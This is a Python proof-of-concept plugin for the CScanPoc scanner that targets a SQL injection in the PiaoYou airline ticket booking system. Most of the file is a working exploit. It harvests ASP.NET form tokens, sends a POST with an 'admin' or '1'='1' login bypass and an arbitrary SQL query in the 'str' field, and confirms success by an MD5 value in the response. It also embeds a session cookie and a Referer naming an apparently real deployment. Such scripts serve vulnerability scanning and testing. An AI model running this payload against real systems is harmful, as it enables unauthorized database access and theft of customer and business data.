# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0012'  # 平台漏洞编号，留空
    name = '票友订票系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-27'  # 漏洞公布时间
    desc = '''
        票友软件是一款用于航空票务代理专用机票管理系统，集成网上订票管理、电话录音弹屏、企业差旅管理、同业订单管理、会员管理、积分管理、短信发送、员工管理、报表生成、财务管理等强大功能，广泛应用于有各航空票务代理人及航空售票点，帮助您提高工作效率，迅速了解客户的需求，极大提高业务成交量，提升客户满意度，协助您在激烈的市场竞争中脱颖而出。
        票友订票系统存在SQL注入漏洞：
        /PiaoYou_root.aspx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0110489'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c9a7c928-4d75-449a-95de-57239311095a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.11 http://www.wooyun.org/bugs/wooyun-2010-0110489
            payload = "/PiaoYou_root.aspx"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target)
            view = re.findall("id=\"__VIEWSTATE\" value=\"([^<>]+)\"", body)
            event = re.findall(
                "id=\"__EVENTVALIDATION\" value=\"([^>]+)\" />", body)
            if len(view) > 0 and len(event) > 0:
                raw = '''
POST xx HTTP/1.1
Host: xx
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://oa.ryxtrip.com/PiaoYou_root.aspx
Cookie: ASP.NET_SessionId=yvzt42mfa5gspzjrisnuxoxz
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 376

__VIEWSTATE=''' + urllib.parse.quote(view[0]) + '''&__EVENTVALIDATION=''' + urllib.parse.quote(event[0]) + '''&aname=admin%27+or+%271%27%3D%271&apwd=&str=select+sys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271%27%29%29&Button1=%E6%89%A7%E8%A1%8C
                '''
                code, head, body, errcode, final_url = hh.http(target, raw=raw)

                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    # security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
